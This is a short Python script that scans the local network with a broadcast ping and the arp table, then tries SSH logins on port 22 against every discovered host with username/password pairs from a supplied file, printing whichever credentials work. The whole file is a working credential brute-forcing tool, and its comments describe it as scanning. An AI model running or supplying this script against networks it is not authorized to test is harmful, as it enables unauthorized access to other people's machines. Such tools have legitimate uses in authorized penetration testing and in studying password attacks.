#!/usr/bin/env python3

import paramiko
import sys, os
import subprocess
import time

#This will accept a rainbow table in a file.txt
file = sys.argv[1]

#Broadcasting to all local network devices to update arp table
broadcast = subprocess.Popen(["ping -c 12 192.168.1.255"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
time.sleep(15)
#Using arp -a
host = subprocess.Popen(["arp -a | egrep -o '[[:digit:]]{1,3}\.[[:digit:]]{1,3}\.[[:digit:]]{1,3}\.[[:digit:]]{1,2}'"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

#stdout = str(host.communicate()[0].decode("ascii")).split()
stdout = host.communicate()[0].decode("ascii").split()

print(stdout)

def SSHLogin(host, port, username, password):
    
    try:
        ssh = paramiko.SSHClient()
        #If we don't have a server key enabled (which we don't, because we are scanning), then ignore the fact that the server host key is not in our list of trusted keys.
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        #Performs the login
        ssh.connect(host, port=port, username=username, password=password)
        ssh_session = ssh.get_transport().open_session()
        #Here we test whether or not we have an active ssh session (meaning that those particular credentials are valid for that particular machine).
        if ssh_session.active:
            print("SSH login successful on {}:{}, with username {} and password {}".format(host, port, username, password))
        else:
            print("SSH login failed")
    except Exception as e:
        return
    
    ssh.close()

with open(file, "r") as f:
    for l in f:
        line = l.split()
        for host in stdout:
            print(host, 22, line[0], line[1])
            SSHLogin(host, 22, line[0], line[1])
f.close()
